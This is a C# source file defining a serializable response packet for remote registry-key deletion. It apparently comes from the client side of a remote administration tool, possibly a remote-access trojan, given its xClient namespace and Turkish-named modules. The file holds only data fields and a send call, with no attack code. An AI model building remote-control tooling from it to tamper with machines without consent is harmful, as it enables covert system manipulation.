﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetDeleteRegistryKeyResponse : IPacket
    {
        public string ParentPath { get; set; }
        public string KeyName { get; set; }

        public bool IsError { get; set; }
        public string ErrorMsg { get; set; }

        public GetDeleteRegistryKeyResponse() { }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
